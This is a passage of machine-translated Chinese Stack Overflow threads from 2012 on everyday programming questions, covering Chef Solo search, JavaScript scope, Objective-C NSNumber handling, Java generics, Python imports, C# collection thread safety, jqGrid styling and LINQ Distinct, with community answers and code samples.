任何有关示例代码的帮助都会有很大帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T07:20:04.773

机器翻译是一个非常复杂的过程。无论如何，如果您希望您的用户掌握您网站的内容，我建议您使用[Google 网站翻译](http://translate.google.com/manager/website/)。

# chef-infra - Chef Solo - Chef::Exceptions::PrivateKeyMissing

> ID：13548534
> 
> 赞同：6
> 
> 时间：2012-11-25T05:18:41.310
> 
> 标签：chef-infra

我正在使用 Chef Solo 并尝试为 Oh My Zsh 安装食谱！这会导致这个烦人的错误：

> 无法读取私钥 /etc/chef/client.pem: Errno::ENOENT: 没有这样的文件或目录 - /etc/chef/client.pem

根据我收集到的信息，这是因为配方中有这一行，它正在尝试进行搜索：

```
search( :users, "shell:*zsh" ).each do |u| 
```

我还没有找到一个令人满意的解决方案来解决这个问题。

由于我对厨师有点陌生，我想知道我应该怎么做？看起来搜索操作需要 Chef Client，但这是否意味着如果我想使用 OMZ，我不能使用 Chef Solo？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-25T15:14:50.047

我今天也遇到了这个问题。似乎 chef-solo 不支持 search() 开箱即用。安装[https://github.com/edelight/chef-solo-search](https://github.com/edelight/chef-solo-search)来解决问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-01-29T20:53:51.797

您（可能）也可以使用[chef-zero](https://www.chef.io/blog/2013/10/31/chef-client-z-from-zero-to-chef-in-8-5-seconds/)而不是 chef-solo。

来自[chef-solo-search](https://github.com/edelight/chef-solo-search)的自述文件：

> ## 弃用警告
> 
> 现在本地模式（“零”）已被引入 Chef（从 11.8 开始），它提供了开箱即用的搜索功能，这个存储库将会少很多人喜欢。我强烈建议您考虑从 Chef Solo 迁移到 Chef Zero 并放弃使用这个库。话虽如此，如果您无法使用 Chef Solo，那么 little chef-solo-search 仍然会为您服务。
> 
> 这是一篇介绍迁移的文章：
> [https ://www.chef.io/blog/2014/06/24/from-solo-to-zero-migrating-to-chef-client-local-mode/](https://www.chef.io/blog/2014/06/24/from-solo-to-zero-migrating-to-chef-client-local-mode/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-11-07T04:21:52.097

您可以在本地模式下使用 chef-client。尝试使用数据库食谱时，这里已经回答了[厨师独奏私钥丢失](https://stackoverflow.com/questions/26944159/chef-solo-private-key-missing-when-trying-to-use-database-cookbook)

# javascript - 外部 JS 是如何实际加载到 html 中的？

> ID：13548544
> 
> 赞同：3
> 
> 时间：2012-11-25T05:20:20.187
> 
> 标签：javascript, jquery, html

我不知道我做的是对还是错，我的理解不是很清楚。我总是制作许多外部 js 文件，并将它们全部放在标题中。我所有的外部 js 文件都以这样的方式开始：

```
$(document).ready(function(){
  //all the functions and variables
}); 
```

例如，如果我有 3 个外部 js 文件：

1.

```
$(document).ready(function(){
  var a = 1000;
  function run(){alert(a)};
  $('#btna').click(function(){run();});
}); 
```

2.

```
$(document).ready(function(){
  var b = 2000;
  function run(){alert(b)};
  $('#btnb').click(function(){run();});
}); 
```

3.

我从未尝试使用其他 JS 文件中的变量和函数。是否可以在第三个 JS 文件中获取`a`and变量？`b`

```
$(document).ready(function(){
  //is it possiblr to do this?
  alert(a+b);
  //or if I use run(), which methods will be called?
  run();
}); 
```

我很困惑......外部JS实际上是如何加载到html中的？或者我不应该在所有文件中准备好文件？现在我想在一个完全加载后一个接一个地加载脚本，而不是同时加载一堆东西。因此，我必须先说清楚。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T05:51:05.590

不要开始将变量放在全局范围内。虽然这有时是必要的，但您最好使用[http://requirejs.org](http://requirejs.org)之类的东西在不同范围之间共享模块。通过使用模块和对象，您可以限制变量的范围并减少由于在具有相同范围的不同文件中定义的变量之间的冲突而导致错误的机会。RequireJS 还为您提供了一种管理依赖项、异步加载 javascript 文件的方法，并提供了一种简洁的方法来优化您的脚本（如果需要）。

正如其他人所指出的那样，从学习的角度来看，您观察到的困难是由于变量的范围是在文档就绪上运行的匿名函数的本地变量。在 JavaScript 中定义的变量`var`具有包含代码块的本地范围。如果您不使用定义变量`var`然后它是全球范围内的。应避免使用全局范围，以减少在多个位置意外重用变量的机会。一个好的经验法则是尽可能地限制范围，将其定义为本地使用它的地方。如果必须全局共享变量，您可能应该将其定义为对象的属性并全局共享该对象。虽然对象是全局共享的，但对象上下文充当变量的范围（如命名空间），如果您不小心将它重用于其他地方用于不同目的，则不太可能发生这种情况。

例如：

```
<script type="text/javascript">
     var globalConstants = {
          a = 5,
          b = 10
     };
</script> 
```

然后您可以稍后参考`globalConstants.a`or `globalConstants.b`- 这样您就不太可能在不知道它们实际上是相同变量的情况下意外地在单独的脚本中重复使用`a`or 。`b`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:24:08.410

每个文件都是独立的[他们不知道其中任何一个存在]，因此`document.ready`如果脚本要求文档准备好，他们将需要每个文件。

最好将脚本包含在正文的末尾而不是头部。看看这个问题：[Putting jQuery/javascript source pages before end of body tag](https://stackoverflow.com/questions/9343392/putting-jquery-javascript-source-pages-before-end-of-body-tag)

现在有趣的是你的例子，你会得到错误，因为你的变量是本地范围的。由于局部作用域，变量`a`、`b`和`run`将在第三个文件中未定义。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T05:28:57.043

在您包含的第一个文件中的 $(document).ready 之上，使变量成为全局变量

```
var a;
var b; 
```

无论您是单独加载还是将其作为一个文件加载，这对 javascript 都没有影响，但通常将经常使用的脚本放在一个 js 文件中而不是加载是一个好主意。

> 现在我想在一个完全加载后一个接一个地加载脚本，而不是同时加载一堆东西。

...这可能会变得更慢，因为你正在加载更多。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-25T05:32:27.940

将 js 代码放在单独的文件中没有任何区别。您可以认为这 3 个文件的结果将是具有此代码的单个文件，

```
$(document).ready(function(){
 var a = 1000;
 function run(){alert(a)};
 $('#btna').click(function(){run();});
});

 $(document).ready(function(){
     var b = 2000;
     function run(){alert(b)};
     $('#btnb').click(function(){run();});
    });

 $(document).ready(function(){
       //is it possiblr to do this?
    alert(a+b); 
       //or if I use run(), which methods will be called?
    run();
 }); 
```

但是在第三个片段中，不可能这样做`a+b`不是因为它们不在单独的文件中，而是因为`a`和`b`是在不同的函数上定义的。JS 有函数作用域。一旦函数终止，变量就会被销毁。

如果您想使用它们，`a+b`只需将它们设为全局（通过`var`从它们中排除）

例如，而不是`var a = 1000`，做`a=1000`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-25T05:33:50.997

在第一个声明的 Javascript 文件中，按照 popnoodles 的建议进行操作。

您也可以在任何其他 js 文件包含之前添加以下内容。

```
<script>
 var a;
 var b;
</script> 
```

全局变量需要在顶部声明，以便后续的 JavaScript 文件可以使用它们。

# matlab - 编程一系列数据：Matlab

> ID：13548553
> 
> 赞同：1
> 
> 时间：2012-11-25T05:22:47.667
> 
> 标签：matlab, statistics, range, octave

我有这个程序，与统计有关。

```
maximo = max(muestra);
minimo = min(muestra);
rango = maximo - minimo;
num_intervalo = round(1 + 3.322*log(length(muestra)));
amplitud = rango/num_intervalo;

rango_intervalo = [];
for i=1 : num_intervalo + 1
    if i == 1
        rango_intervalo(i: num_intervalo + 1) = minimo;
    else
        rango_intervalo(i: num_intervalo + 1) = rango_tabulado(i) + amplitud;
    end
    if i == num_intervalo + 1
        rango_intervalo(i: num_intervalo + 1) = maximo;
    end
end
rango_intervalo = rango_intervalo'; 
```

目的是创建九个（或 k 个间隔）间隔，其中每个间隔都有其范围：

```
[1.580 - 2.587]
[2.587 - 3.594]
.
.
[9.636 - 10.650] 
```

使用我编写的代码，它会根据意图产生 10 个数据而不是 9 个数据。任何想法，改进此代码？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T07:39:31.313

怎么样：

```
intervals = linspace(minimo, maximo, num_intervalo + 1 );
intervals = [ intervals(1:end-1); intervals(2:end) ]'; 
```

# objective-c - 使用 objectAtIndex Objective-C 时的值错误

> ID：13548554
> 
> 赞同：1
> 
> 时间：2012-11-25T05:22:48.007
> 
> 标签：objective-c, indexing, nsarray, return-value

我有一个包含 50 和 60 两个元素的数组：

```
NSArray*array = [NSArray arrayWithObjects:
                [NSNumber numberWithLong:50],
                [NSNumber numberWithLong:60], nil]; 
```

稍后使用数组时（实际上我正在将此数组作为默认列表写入 plist 文件）我这样做：

```
long value = [array objectAtIndex:1]; 
```

在这个值包含**15559**之后，我不明白。在调试器中**[array objectAtIndex:1]**清楚地显示**(long)60**。

![在此处输入图像描述](../Images/d938e473128ca755548a44426e1f24d4.png)

对不起，我看不出有什么问题;(

有任何想法吗？

罗纳德

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-25T05:26:46.393

A`long`不是`NSNumber`. 如果要设置`value`为 a `long`，`[array objectAtIndex:1]`则必须将其从 NSNumber 转换为 long。您可能希望调用`longValue`NSNumber 来执行此操作。

您可能想知道为什么编译器不在这里抱怨并帮助您。这可能是因为数组中的对象作为 id 被提取，所以大多数赌注都被取消了。这是数组的一个常见问题：知道你正在获取什么以及如何处理它，这取决于你。

您的调试器屏幕截图非常棒。请注意，如果您现在仔细看，头脑清晰，很清楚一方面`value`是 a `long`，另一方面`array[0]`是 NSNumber 包装长。所以调试器实际上一直在回答你的问题！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T05:26:34.177

这是因为您没有调用`longValue`从数组中获取的对象：

```
long value = [[array objectAtIndex:1] longValue]; 
```

您的代码获得的是 的*地址*，`NSValue`该地址被转换为`long`与您存储在数组中的数字无关的“垃圾”值。

# asp.net - 在 C# 中使用 ASP.NET Web API

> ID：13548556
> 
> 赞同：0
> 
> 时间：2012-11-25T05:23:47.427
> 
> 标签：asp.net, .net-4.5

ASP.NET Web API 似乎缺少 WCF Web 服务的服务合同/数据合同功能，这些功能会生成可用于生成代理类的 wsdl。我想知道 Web API 是否旨在用于面向服务的体系结构中的消费，或者它是否仅用于 Ajax 消费。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:51:15.207

Web API（据我所知）不支持 WSDL 生成。如果您绝对需要 WSDL，[WCF REST](http://aspnet.codeplex.com/wikipage?title=WCF%20REST) **可能**是一个选项，尽管不再受支持。

面向服务的体系结构不需要使用 SOAP 或依赖 WSDL，RESTful 服务并不局限于仅对 AJAX 请求有用。[nuget 提供了](http://www.nuget.org/packages/RestSharp)很多 RESTful Web 服务客户端库，可以更轻松地与这些服务进行交互。虽然它可能不像使用代码生成那么简单，但创建一个可以与其他 C# 客户端共享的 POCO 类库也使事情变得更容易。希望有帮助。

# xml - 用于显示大型 xml 文件 vb.net 的控制缓冲区

> ID：13548559
> 
> 赞同：0
> 
> 时间：2012-11-25T05:24:09.310
> 
> 标签：xml, vb.net

问题：我有十几个 xml 文件，大小在 1 到 5 MP 之间。使用带有 ASP.NET 的 vb.net 如何通过按字节控制显示量来显示 xml 文件 加载页面后我必须实现的案例显示 我需要显示 200kb ，一旦用户向下滚动我需要加载更多直到整个xml

或其他情况，一旦页面加载，显示 200kb 的 xml 文件，显示给用户并继续加载

有没有可能实现这个想法。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:32:17.060

那么，你如果字符是 ASCII 字符，你可以假设每个字符是 1 个字节。因此，只需取一个长度为 n 的子串。如果它们以另一种方式编码，您将必须找出使用的编码以及一个字符包含多少字节。

# ios - 只为表格中的最后一行设置不同的高度，有没有更有效的方法？

> ID：13548561
> 
> 赞同：0
> 
> 时间：2012-11-25T05:24:37.290
> 
> 标签：ios, uitableview

除最后一行外，所有行在表中的高度相同。如果我们忘记了最后一行，在正常情况下，我会像这样设置表格视图的高度：

```
[self.tableView setRowHeight:40.0f]; 
```

但是，如果我希望最后一行的高度不同，我将实现委托方法`heightForRowAtIndexPath`，然后为所有索引路径调用该方法。这似乎相当昂贵，并且可能会影响超过 1000 行数据的性能。

我没有看到任何其他方式，但会保持乐观，直到我得到反馈。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T07:55:42.887

如果您只返回一个或另一个高度，基于单个 if 语句，它可能不会那么昂贵。方法调用非常便宜。如果您正在执行一些计算（通常，根据一行中的文本长度计算可变高度），那么您会看到性能下降。该方法仅在重新加载 tableView 时调用，因此滚动性能不会成为问题。

您应该始终首先使用自然框架方法并检查性能，而不是假设某些事情会很慢并做出复杂的解决方法。就像那个人说的，过早的优化等等。

此外，如果您的表中有超过 1000 行，则最好在旁边有一个索引，否则将无法使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:28:56.300

实现表格的页脚视图并实现委托，

```
- (CGFloat)tableView:(UITableView *)tableView heightForFooterInSection:(NSInteger)section; 
```

检查页脚视图是否可以满足您的要求。如果您不能使用页脚视图，则可能必须实现表格视图的委托方法来设置行高，如您的问题中所述。除非您在那里进行一些昂贵的操作，否则它不会对性能造成任何影响。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T05:41:45.337

```
No you can implement this by specifying different height for different rows as per your requirement.

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (indexPath.row == [YourArray count]-1)
    {

        return CustomHeightYouNeedForYourCell;
    }

    return DefaultheightForAllCells;
} 
```

# javascript - 如何在拖动时阻止 jQuery UI 的 Sortable 操作 DOM？

> ID：13548567
> 
> 赞同：1
> 
> 时间：2012-11-25T05:25:41.700
> 
> 标签：javascript, jquery, jquery-ui

看这个[可排序的演示](http://jqueryui.com/sortable/#default)。当你拖动元素时，jQuery 会实时修改列表的 DOM，以便你可以得到拖放效果的反馈。有没有办法关闭这种行为？或者至少为此付出我自己的行为？

**编辑：**我想保留所有其他 DOM 操作。我只想删除占位符元素的动态移动。

谢谢！

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-25T06:29:41.997

除非到目前为止有更好的解决方案，否则我有一个解决方法。添加：

`placeholder: 'placeholder'`作为设置，然后在 CSS 中添加：

```
.placeholder {
  display: none
} 
```

这至少使元素成为一种无操作。

# java - MANIFEST.MF 中的 Class-Path 是否只能包含 jar 文件？

> ID：13548573
> 
> 赞同：13
> 
> 时间：2012-11-25T05:27:25.970
> 
> 标签：java, jar, classpath, manifest

我想在其他目录中包含类文件，而不是主类的目录。

如果我将这些目录放入它的`Class-Path`属性中`MANIFEST.MF`是行不通的。

为什么？除了将这些类打包到 jar 文件中之外，还有其他解决方案吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-25T07:08:23.930

如此链接中所述，需要尾部斜杠：

[类路径属性](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/jar.html#classpath)

# java - 进程不在类型变量 T 的范围内

> ID：13548574
> 
> 赞同：3
> 
> 时间：2012-11-25T05:27:28.853
> 
> 标签：java, generics, comparable

我正在尝试编译我的项目，但出现以下错误：
“错误：类型参数进程不在类型变量 T 的范围内”

```
public class Heap<T extends Comparable<T>> {
    // ...
}

public class Process {
    // ...
}

public class HeapDemo{
    public static void main(final String[] args) {      
        Heap<Process> heap = new Heap<Process>(); //error here
    }   
} 
```

该程序是一个使用堆的 CPU 调度模拟，如果有帮助的话。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:29:29.940

您收到错误的原因是 that `Process`doesn't implement ，由于您对泛型类型设置了类型约束，您`Comparable<Process>`作为类型参数提供的所有类都必须满足该条件。`Heap<T>`

# windows - 可以判断 NSApplicationActivationPolicyProhibited 应用程序是否处于活动状态？

> ID：13548578
> 
> 赞同：1
> 
> 时间：2012-11-25T05:28:02.377
> 
> 标签：windows, cocoa, background, multi-touch, juce

使用带有 TUIO 的 JUCE，我正在开发一个多点触控实用程序来向其他应用程序发送“热键”命令（我正在使用一个发送 TUIO 消息的 USB 触摸框架）。例如，我提供了一个界面，用户可以通过该界面按住以编程组合键，然后点击该按钮将编程的组合键发送到另一个应用程序。我在 OSX 上完成此操作的方法是将我的实用程序作为“仅后台”应用程序 ( `NSApplicationActivationPolicyProhibited`) 运行。我使用`[NSWindow setCanHide: NO]`所以我的实用程序的 GUI 是可见的，即使它作为后台应用程序运行。

它运行良好，除非另一个应用程序的窗口位于我的顶部。发生的情况是触摸通过其他应用程序传递到我的应用程序中 - 导致我的应用程序中无意按下按钮。通常，我可以让我的应用程序只在活动应用程序时监听 TUIO 触摸回调，`[NSApp isActive]`. 但是，由于我的应用程序只是后台，它永远不会处于活动状态，我无法判断是否有另一个窗口正在覆盖它以防止触摸。

那么，有没有办法让“仅后台”应用程序能够判断它是否位于所有其他窗口之上？或者，有没有办法从我的应用程序中获取来自其他应用程序的所有 Cocoa 窗口的列表，并能够判断它们是否出现在我的“仅背景”应用程序之上？

另外，有谁知道我将如何在 Windows 中进行上述所有操作？换句话说，Windows 相当于什么，`NSApplicationActivationPolicyProhibited`我能否判断它是否被其他应用程序的窗口覆盖？

# python - 从 Python 中的另一个程序访问类/方法

> ID：13548581
> 
> 赞同：0
> 
> 时间：2012-11-25T05:28:21.090
> 
> 标签：python, python-2.3

我有一个程序 ( )，它在其代码中`blackjack.py`访问另一个程序的 (`cards.py`和)。`games.py`其中大部分来自一本书，所以我无法理解它是如何工作的。

继承人的代码`cards.py`：

```
class Card(object):
    """ A playing card. """
    RANKS = ["A", "2", "3", "4", "5", "6", "7",
             "8", "9", "10", "J", "Q", "K"]
    SUITS = ["c", "d", "h", "s"]
    def __init__(self, rank, suit, face_up = True):
        self.rank = rank
        self.suit = suit
        self.is_face_up = face_up

    def __str__(self):
        if self.is_face_up:
            rep = self.rank + self.suit
        else:
            rep = "XX"
        return rep

    def flip(self):
        self.is_face_up = not self.is_face_up

class Hand(object):
    """ A Hand of playing cards. """
    def __init__(self):
        self.cards = []

    def __str__(self):
        if self.cards:
            rep = ""
            for card in self.cards:
                rep += str(card) + "\t"
        else:
            rep = "<empty>"
        return rep

    def clear(self):
        self.cards = []

    def add(self, card):
        self.cards.append(card)

    def give(self, card, other_hand):
        self.cards.remove(card)
        other_hand.add(card)

class Deck(Hand):
    """ A deck of playing cards. """
    def populate(self):
        for suit in Card.SUITS:
            for rank in Card.RANKS:
                self.add(Card(rank, suit))

    def shuffle(self):
        import random
        random.shuffle(self.cards)

    def deal(self, hands, per_hand = 1):
        for round in range(per_hand):
            for hand in hands:
                if self.cards:
                    top_card = self.cards[0]
                    self.give(top_card, hand)
                else:
                    print "Can't continue deal. Out of cards!"

if __name__ == "__main__":
    print "This is a module with classes for playing cards."
    raw_input("\n\nPress the enter key to exit.") 
```

我正在为 写一个错误检查，`blackjack.py`我需要收集到目前为止已使用的卡的数量。我想我可以通过访问`cards[]`. 问题是，我不确定如何做到这一点。

不过，这都是理论上的。我也会包含 `blackjack.py' 代码，所以你们都可以看到我正在尝试做什么，并帮助我确定我的逻辑是否有缺陷。

`blackjack.py` [代码](https://www.dropbox.com/s/5i8xr886hg5wcaj/blackjack_Attempt_3.py)

任何和所有输入表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:03:00.100

虽然我并不完全清楚您在这里的预期结构，但您有几个选择。

首先，为了使用模块中的任何函数或类，`cards.py`您`blackjack.py`可以使用`import`语句导入它们。这样做有两种风格：

```
# blackjack.py
import cards 
```

可以让您访问`cards`模块中的所有内容，并且您可以通过在每个函数/类前面加上`cards.<name>`. 所以，如果你想初始化一个`Deck`类的实例，

```
# blackjack.py
import cards
mydeck = cards.Deck() 
```

另一种方式是`from <X> import <Y>`，它使您无需添加前缀即可访问函数和类。例子：

```
# blackjack.py
from cards import Deck  # or, to import everything, "from cards import *"
mydeck = Deck() 
```

这些方法中的任何一个都会为您提供该类的实例`cards.Deck`。

### 选项 0

您已经可以在您的`Deck`班级中说明这一点，因为它是 的子类`Hand`，因此每次您使用卡片时，它都会从的属性`give`中取出。因此，发出的卡片数量将是：`Deck``cards`

```
class Deck(Hand):
    # ...
    def number_cards_used(self):
         return 52 - len(self.cards) 
```

或者，如果您无法编辑`cards.py`，您可以简单地通过以下方式获取您给定的卡片数量`Deck`：

```
# blackjack.py
def get_number_cards_used_from_deck(deck):
    return 52 - len(deck.cards) 
```

正在使用：

```
# blackjack.py
import cards
mydeck = cards.Deck()
# ...
# Do other operations with deck
# ...
cards_used = get_number_cards_used_from_deck(mydeck) 
```

### 选项1

如果您可以隔离所有同时玩的手，您可以实现一个方法`card_count`：

```
class Hand(object):
   # ...
   # other code
   # ....

   def card_count(self):
       return len(self.cards) 
```

然后，例如，如果您有所有手牌的列表，您可以执行以下操作：

```
sum(map(lambda h: h.card_count(), list_of_hands)) 
```

### 选项 2

在您的`Deck`类中，由于它是子类`Hand`，因此您可以简单地保留另一个已分发的卡片的运行列表，这些卡片通常会被刷新。这看起来像：

```
class Deck(Hand):
    # ...
    # other code
    # ...

    def __init__(self):
        self.populate()
        self.used_cards = []

    def give(self, card, other_hand):
        self.used_cards.append(card)
        super(Deck, self).give(card, other_hand)

    def number_cards_used(self):
        return len(self.used_cards) 
```

当然，还有其他方法。

# android - SystemClock.uptimeMillis() 怎么可能换行？

> ID：13548585
> 
> 赞同：6
> 
> 时间：2012-11-25T05:28:59.170
> 
> 标签：android, system-clock

[uptimeMillis() 上](http://developer.android.com/reference/android/os/SystemClock.html#uptimeMillis%28%29)的Android 文档说：

> 返回自启动以来的毫秒数，不计算深度睡眠所花费的时间。**注意**：此值可能会偶尔重置（否则会回绕）。

似乎很奇怪，文档担心它会一直缠绕。毕竟，该方法返回一个long。快速计算得出，它需要大约 292,271,023 年才能完成！

那么文档是怎么回事？它真的有可能包装吗？该值可以在长时间达到最大值之前包装吗？这就是文档实际上想说的吗？如果是这样，它什么时候会结束？

* * *

[这尤其令人费解，因为[System.currentTimeMillis()](http://developer.android.com/reference/java/lang/System.html#currentTimeMillis%28%29)也是一个 long 表示自一个纪元以来的时间。然而，Android 完全没有提到价值包装的可能性。更何况，对于从 0 开始的 uptimeMillis...]

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T05:42:30.023

这主要是推测，但根据我找到的文档似乎是有道理的。如果我们考虑到`native public static long uptimeMillis()`in`SystemClock`是一个本地方法，在 32 位空间中运行，然后`long`当您调用它时它只是被转换为 Java，那么这是有道理的，因为 2^32 毫秒很容易达到。

# c# - 同步收集线程安全

> ID：13548587
> 
> 赞同：2
> 
> 时间：2012-11-25T05:29:11.400
> 
> 标签：c#, multithreading, collections, thread-safety

我有 System.Collections.Generic.SynchronizedCollection 共享集合。我们的代码使用 .Net 4.0 任务库来跨越线程并将同步集合传递给线程。到目前为止，线程还没有在集合中添加或删除项目。但是需要一个线程的新要求必须从集合中删除项目，而另一个线程只读取集合。在从集合中删除项目之前，我是否需要添加锁定？如果是这样，阅读器线程是否是线程安全的？或建议获得线程安全的最佳方法？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2016-03-24T18:12:31.803

不，它不是完全线程安全的。在一个简单的控制台应用程序中尝试以下操作，看看它是如何因异常而崩溃的：

```
var collection = new SynchronizedCollection<int>();

var n = 0;

Task.Run(
    () =>
        {
            while (true)
            {
                collection.Add(n++);
                Thread.Sleep(5);
            }
        });

Task.Run(
    () =>
        {
            while (true)
            {
                Console.WriteLine("Elements in collection: " + collection.Count);

                var x = 0;
                if (collection.Count % 100 == 0)
                {
                    foreach (var i in collection)
                    {
                        Console.WriteLine("They are: " + i);
                        x++;
                        if (x == 100)
                        {
                            break;
                        }

                    }
                }
            }
        });

Console.ReadKey(); 
```

[![在此处输入图像描述](../Images/57be322d9f16e988d1690e1f43ea7d6d.png)](https://i.stack.imgur.com/IoH2a.png)

请注意，如果您将 SynchronizedCollection 替换为 ConcurrentBag，您将获得线程安全：

```
var collection = new ConcurrentBag<int>(); 
```

SynchronizedCollection 在此应用程序中根本不是线程安全的。改用并发集合。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-04-21T09:24:15.300

正如亚历山大已经指出的那样`SynchronizedCollection`，这种情况下不是线程安全的。实际上包装了一个普通的`SynchronizedCollection`通用列表，并且只是将每个调用委托给底层列表，并在调用周围加锁。这也是在`GetEnumerator`. 所以枚举器的获取是同步的，但不是实际的枚举。

```
var collection = new SynchronizedCollection<string>();
collection.Add("Test1");
collection.Add("Test2");
collection.Add("Test3");
collection.Add("Test4");

var enumerator = collection.GetEnumerator();
enumerator.MoveNext();
collection.Add("Test5");
//The next call will throw a InvalidOperationException ("Collection was modified")
enumerator.MoveNext(); 
```

使用 foreach 时，将以这种方式调用枚举器。因此，在枚举此数组之前添加 a`ToArray()`也不起作用，因为这将首先枚举到此数组中。当您在 foreach 中执行操作时，此枚举可能会更快，因此它可以降低出现并发问题的可能性。正如理查德指出的那样：为了真正的线程安全，请选择`System.Collections.Concurrent`类。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-25T05:44:36.877

是的，SynchronizedCollection 将为您进行锁定。

如果您有多个阅读器而只有一个编写器，您可能希望考虑使用 ReaderWriterLock，而不是 SynchronizedCollection。

此外，如果您是 .Net 4+，请查看`System.Collections.Concurrent`. 这些类的性能比 SynchronizedCollection 好得多。

# python - 在 Google 应用引擎中运行时，在 web2py 中创建的新表看不到

> ID：13548590
> 
> 赞同：1
> 
> 时间：2012-11-25T05:29:26.510
> 
> 标签：python, google-app-engine, web2py

我使用 web2py 创建了一个应用程序，并使用语法 db.define_table() 在其中声明了某些新表，但是当我在 Google App Engine 中运行应用程序时，即使在我的本地服务器上也看不到创建的表。web2py 自己创建的表，如 auth_user 和 auth 中的其他表是可用的。

我在这里想念什么？我已经在我的应用程序的 db.py 中声明了新表。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T14:27:20.227

App Engine 数据存储区实际上并没有表。也就是说，如果 web2py 能够使用数据存储区（我不熟悉它），那么一旦实体出现，Kinds（有点像表）只会出现在管理控制台（本地 /_ah/admin）中已创建（即表仅在插入一行后显示，您将永远不会看到空表）。

# javascript - 度假村 jqGrid 后颜色消失

> ID：13548594
> 
> 赞同：0
> 
> 时间：2012-11-25T05:30:24.670
> 
> 标签：javascript, jquery, css

在初始化期间设置 css 属性时，它可以正常工作，从函数启动时，单元格中的颜色和背景也会发生变化。但是当我对列进行排序时，从函数中设置的所有颜色都会消失并返回到正常网格。

```
<script>
var Mydata =[
  {
    "id":"560058",
    "nm" : "L 41971",
    "temp" : "21.2",
    "ignition" : "off",
    "pos_x" : "55.2024832",
    "pos_y" : "24.9640256",
    "drv" : "",
    "pos_s" : "0",
    "param24" : "0",
    "param240" : "0",
    "pwr_ext" : "12.825"
  },
  {
    "id":"560059",
    "nm" : "L 41972",
    "temp" : "21.2",
    "ignition" : "off",
    "pos_x" : "55.2024832",
    "pos_y" : "24.9640256",
    "drv" : "",
    "pos_s" : "0",
    "param24" : "0",
    "param240" : "0",
    "pwr_ext" : "12.825"
  }
];
var grid = $("#live_view");
grid.jqGrid({
  height: '100%',
  width: '700',
  datatype: "local",
  loadonce: true,
  data : Mydata,
  gridview: true,
  colNames: ['Name', 'Temperature', 'Ignition', 'lat', 'lon', 'Driver', 'Speed', 'param24', 'movement', 'pwr_ext'],
  colModel:[
    {name:'nm',index:'nm'},
    {name:'temp',index:'temp'},
    {name:'ignition',index:'ignition'},
    {name:'pos_x',index:'pos_x'},
    {name:'pos_y',index:'pos_y'},
    {name:'drv',index:'drv'},
    {name:'pos_s',index:'pos_s'},
    {name:'param24',index:'param24'},
    {name:'param240',index:'param240'},
    {name:'pwr_ext',index:'pwr_ext'},
  ],
  rowNum:100,
  rowList:[100,200,300],
  pager: '#pager2',
  sortname: 'param240',
  viewrecords: true,
  sortorder: "desc",
  caption:"Vertex Live View",
  loadComplete: function() {
    grid.jqGrid('setCell',"560058","nm","",color:'red'});
  },
});
$("#live_view").jqGrid('navGrid','#pager2',{edit:false,add:false,del:false});
$("#cc").click(function (){
  $("#live_view").jqGrid('setCell',"560058","nm","",{color:'blue'});
})
</script>
<a href="#" id="cc">Change Colour</a> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T08:32:34.933

排序时，它会重新创建 html。jqgrid 都知道，您修改的列在排序后甚至可能在当前页面上不可见。底线，您将需要重新应用颜色。

您可以仔细阅读 jqGrid api，看看它们是否允许从模型数据中设置单元格的颜色。不过我不这么认为。

# c# - vb.net LINQ 选择与列表不同

> ID：13548596
> 
> 赞同：1
> 
> 时间：2012-11-25T05:31:12.190
> 
> 标签：c#, .net, vb.net, linq, datatable

我有一个`datatable`包含一些重复值的列，我想将这些值添加到 a`listbox`但没有重复

我尝试了以下

```
Dim a = From row In table.AsEnumerable.Distinct.ToList Select row.Field(Of String)("name") 
```

但它给了我重复的值，没有重复怎么办？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-25T05:33:40.680

我相信每一行都有更多的列是唯一的，这就是为什么 distinct 没有按预期返回结果的原因。相反，您应该首先选择列而不是对其应用不同的列。

所以试试这个：

```
Dim a = (From row In table.AsEnumerable()
        Select row.Field(Of String)("name")).Distinct().ToList() 
```

希望这会有所帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T05:35:53.603

您可以将 IEqualityComparer 传递给 distinct 函数。看到这个答案[Distinct() with lambda？](https://stackoverflow.com/questions/1300088/distinct-with-lambda)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-28T11:05:11.877

我有同样的问题。我发现在匿名类型上不同的作品。所以我先做不同的然后复制到一个列表中。

```
 Dim  _ret = New List(Of Marcas)()
    For Each m In lista.Select(Function(s) New With {Key .id = s.BrandNo, .nombre = s.BrandName}).Distinct()
        _ret.Add(New Marcas With {.id = m.id, .nombre = m.nombre})
    Next 
```

